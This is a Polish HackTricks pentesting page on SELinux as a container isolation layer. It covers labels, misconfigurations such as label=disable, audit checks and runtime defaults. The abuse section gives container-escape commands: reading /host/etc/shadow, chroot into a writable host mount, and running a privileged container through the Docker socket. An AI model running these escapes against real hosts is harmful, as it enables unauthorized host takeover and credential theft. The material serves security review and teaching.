# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

SELinux to system **obowiązkowej kontroli dostępu opartej na etykietach**. Każdy istotny proces i obiekt może mieć kontekst bezpieczeństwa, a polityka decyduje, które domeny mogą wchodzić w interakcję z jakimi typami i w jaki sposób. W środowiskach konteneryzowanych zwykle oznacza to, że runtime uruchamia proces kontenera w ograniczonej domenie kontenera i etykietuje zawartość kontenera odpowiednimi typami. Jeśli polityka działa poprawnie, proces będzie mógł odczytywać i zapisywać elementy, z którymi jego etykieta powinna mieć do czynienia, jednocześnie mając odmowę dostępu do innych zasobów hosta, nawet jeśli te zasoby staną się widoczne poprzez mount.

Jest to jedna z najpotężniejszych ochron po stronie hosta dostępnych w mainstreamowych wdrożeniach kontenerów Linux. Ma to szczególne znaczenie w systemach takich jak Fedora, RHEL, CentOS Stream, OpenShift i innych ekosystemach skoncentrowanych na SELinux. W takich środowiskach recenzent, który zignoruje SELinux, często źle oceni, dlaczego oczywisty wydawałoby się sposób przejęcia hosta jest w rzeczywistości zablokowany.

## AppArmor kontra SELinux

Najprostsza różnica na wysokim poziomie polega na tym, że AppArmor jest oparty na ścieżkach, podczas gdy SELinux jest **oparty na etykietach**. Ma to duże konsekwencje dla bezpieczeństwa kontenerów. Polityka oparta na ścieżkach może zachowywać się inaczej, jeśli ta sama zawartość hosta stanie się widoczna pod nieoczekiwaną ścieżką montowania. Polityka oparta na etykietach natomiast pyta, jaka jest etykieta obiektu i co domena procesu może z nim zrobić. To nie sprawia, że SELinux jest prosty, ale czyni go odpornym na klasę założeń bazujących na sztuczkach ze ścieżkami, które obrońcy czasem przypadkowo popełniają w systemach opartych na AppArmor.

Ponieważ model jest zorientowany na etykiety, obsługa wolumenów kontenera i decyzje o ponownym etykietowaniu są krytyczne dla bezpieczeństwa. Jeśli runtime lub operator zmienia etykiety zbyt szeroko, żeby "mounty działały", granica polityki, która miała zawierać workload, może stać się znacznie słabsza niż zamierzano.

## Laboratorium

Aby sprawdzić, czy SELinux jest aktywny na hoście:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Aby sprawdzić istniejące etykiety na hoście:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Aby porównać normalne uruchomienie z takim, w którym etykietowanie jest wyłączone:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hoście z włączonym SELinux to bardzo praktyczne pokazanie, ponieważ obrazuje różnicę między procesem uruchomionym w oczekiwanej domenie kontenera a takim, któremu odebrano tę warstwę egzekwowania.

## Użycie w czasie działania

Podman jest szczególnie dobrze zintegrowany z SELinux na systemach, gdzie SELinux jest domyślną częścią platformy. Rootless Podman wraz z SELinux to jedna z najsilniejszych powszechnie stosowanych konfiguracji kontenerów, ponieważ proces po stronie hosta jest już nieuprzywilejowany i jednocześnie nadal ograniczony przez politykę MAC. Docker również może korzystać z SELinux tam, gdzie jest to wspierane, chociaż administratorzy czasami go wyłączają, aby obejść problemy z etykietowaniem woluminów. CRI-O i OpenShift silnie polegają na SELinux jako części ich mechanizmu izolacji kontenerów. Kubernetes też może udostępniać ustawienia związane z SELinux, lecz ich wartość oczywiście zależy od tego, czy system operacyjny węzła rzeczywiście wspiera i egzekwuje SELinux.

Powtarzający się wniosek jest taki, że SELinux nie jest opcjonalną ozdobą. W ekosystemach zbudowanych wokół niego jest częścią oczekiwanej granicy bezpieczeństwa.

## Błędne konfiguracje

Klasycznym błędem jest `label=disable`. Operacyjnie często dzieje się tak, że montowanie woluminu zostało zablokowane, a najszybszym doraźnym rozwiązaniem było usunięcie SELinux z równania zamiast naprawienia modelu etykietowania. Innym częstym błędem jest nieprawidłowe ponowne etykietowanie zawartości hosta. Szerokie operacje relabelingu mogą sprawić, że aplikacja zacznie działać, ale jednocześnie mogą rozszerzyć zakres zasobów, do których kontener ma dostęp, znacznie poza zamierzenia.

Ważne jest też, by nie mylić **zainstalowanego** SELinux z **efektywnym** SELinux. Host może wspierać SELinux, a mimo to być w trybie permissive, albo runtime może nie uruchamiać procesu w oczekiwanej domenie. W takich przypadkach ochrona jest znacznie słabsza niż sugeruje dokumentacja.

## Nadużycia

Gdy SELinux jest nieobecny, w trybie permissive lub szeroko wyłączony dla workloadu, ścieżki zamontowane z hosta stają się znacznie łatwiejsze do nadużycia. Ten sam bind mount, który normalnie byłby ograniczony etykietami, może stać się bezpośrednią drogą do danych hosta lub modyfikacji hosta. Ma to szczególne znaczenie w połączeniu z zapisywalnymi volume mounts, katalogami runtime kontenera lub operacyjnymi skrótami, które dla wygody ujawniły wrażliwe ścieżki hosta.

SELinux często tłumaczy, dlaczego ogólny opis breakout działa od razu na jednym hoście, a na innym zawodzi mimo podobnych flag runtime. Brakującym składnikiem nie jest często namespace ani capability, lecz granica etykiet, która pozostała nienaruszona.

Najszybsza praktyczna kontrola to porównanie aktywnego kontekstu, a następnie sprawdzenie zamontowanych ścieżek hosta lub katalogów runtime, które normalnie byłyby ograniczone etykietami:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Jeśli na hoście obecny jest bind mount i etykietowanie SELinux zostało wyłączone lub osłabione, często najpierw dochodzi do ujawnienia informacji:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Jeśli mount jest writable i container jest effectively host-root z punktu widzenia kernel, kolejnym krokiem jest przetestowanie kontrolowanej modyfikacji hosta zamiast zgadywania:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostach obsługujących SELinux, utrata etykiet wokół katalogów stanu runtime może także ujawnić bezpośrednie ścieżki privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Te polecenia nie zastępują pełnego escape chain, ale bardzo szybko wyjaśniają, czy to SELinux uniemożliwiał dostęp do danych hosta lub modyfikację plików po stronie hosta.

### Pełny przykład: SELinux wyłączony + zapisywalny montaż hosta

Jeśli etykietowanie SELinux jest wyłączone, a system plików hosta jest zamontowany z prawami zapisu w `/host`, pełny host escape staje się zwykłym przypadkiem nadużycia bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli `chroot` powiedzie się, proces containera działa teraz w systemie plików hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Pełny przykład: SELinux wyłączony + Runtime Directory

Jeśli workload może dotrzeć do runtime socket po wyłączeniu labels, escape można przekazać do runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Istotna obserwacja jest taka, że SELinux często był mechanizmem uniemożliwiającym właśnie tego typu dostęp do host-path lub runtime-state.

## Sprawdzenia

Celem sprawdzeń SELinux jest potwierdzenie, że SELinux jest włączony, określenie bieżącego kontekstu bezpieczeństwa oraz sprawdzenie, czy pliki lub ścieżki, które cię interesują, są faktycznie ograniczone etykietami.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Co jest tutaj interesujące:

- `getenforce` powinno w idealnym przypadku zwracać `Enforcing`; `Permissive` lub `Disabled` zmienia znaczenie całej sekcji SELinux.
- Jeśli bieżący kontekst procesu wygląda nieoczekiwanie lub jest zbyt szeroki, workload może nie być uruchomiony zgodnie z zamierzoną polityką kontenera.
- Jeśli pliki zamontowane z hosta lub katalogi runtime mają etykiety, do których proces ma zbyt swobodny dostęp, bind mounts stają się dużo bardziej niebezpieczne.

Podczas przeglądu kontenera na platformie obsługującej SELinux nie traktuj etykietowania jako szczegółu drugorzędnego. W wielu przypadkach jest to jedna z głównych przyczyn, dla których host nie został jeszcze skompromitowany.

## Domyślne ustawienia runtime

| Runtime / platform | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Zależne od hosta | Separacja SELinux jest dostępna na hostach z włączonym SELinux, ale dokładne zachowanie zależy od konfiguracji hosta/daemona | `--security-opt label=disable`, szerokie ponowne etykietowanie bind mounts, `--privileged` |
| Podman | Zazwyczaj włączony na hostach z SELinux | Separacja SELinux jest normalną częścią Podman na systemach SELinux, chyba że jest wyłączona | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Na poziomie Poda zazwyczaj nie przypisywane automatycznie | Wsparcie dla SELinux istnieje, ale Pody zwykle potrzebują `securityContext.seLinuxOptions` lub domyślnych ustawień specyficznych dla platformy; wymagane jest wsparcie runtime i węzłów | słabe lub zbyt szerokie `seLinuxOptions`, uruchamianie na nodach w trybie permissive/disabled, polityki platformy wyłączające etykietowanie |
| CRI-O / OpenShift style deployments | Zazwyczaj na nich mocno polegane | SELinux często stanowi kluczową część modelu izolacji węzła w tych środowiskach | niestandardowe polityki, które nadmiernie rozszerzają dostęp, wyłączanie etykietowania dla zgodności |

Domyślne ustawienia SELinux są bardziej zależne od dystrybucji niż domyślne ustawienia seccomp. W systemach typu Fedora/RHEL/OpenShift SELinux często jest centralnym elementem modelu izolacji. W systemach bez SELinux jest po prostu nieobecny.
{{#include ../../../../banners/hacktricks-training.md}}
